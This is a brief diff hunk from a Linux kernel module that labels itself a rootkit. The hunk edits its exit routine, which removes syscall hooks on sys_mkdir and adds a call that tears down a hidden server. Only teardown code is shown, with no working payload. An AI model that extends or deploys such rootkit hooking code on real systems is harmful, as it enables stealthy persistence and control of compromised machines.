@@ -18,7 +18,7 @@ static void __exit ModuleExit(void) {
 	remove_hook(&sys_mkdir); //removes sys_mkdir hook
 	//remove_hook(&sys_execve); //removes sys_execve hook
 	client_print("[rootkit] module removed!!!\n");
-
+	remove_server();
 	printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
 }
 
